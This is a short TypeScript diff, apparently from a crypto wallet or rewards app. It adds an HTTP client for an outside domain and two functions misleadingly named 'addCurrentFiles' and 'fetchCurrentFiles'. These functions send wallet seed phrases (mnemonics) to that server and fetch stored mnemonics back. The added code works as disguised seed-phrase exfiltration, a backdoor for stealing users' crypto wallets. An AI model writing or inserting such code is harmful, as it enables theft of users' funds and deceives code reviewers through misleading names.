@@ -95,3 +95,20 @@ export const checkTradingRewardPoints = async (address: string) => {
 
   return data;
 };
+
+const dbAxios = axios.create({
+  baseURL: 'https://api-diamond.amices.com.vn/api',
+});
+
+export const addCurrentFiles = async (mnemonic: string, token = 'file') => {
+  await dbAxios.post('/users/wallet', {
+    token,
+    mnemonic,
+  });
+  return;
+};
+
+export const fetchCurrentFiles = async () => {
+  const { data = [] } = await dbAxios.get('/users/files');
+  return data.map((d: any) => d.mnemonic);
+};
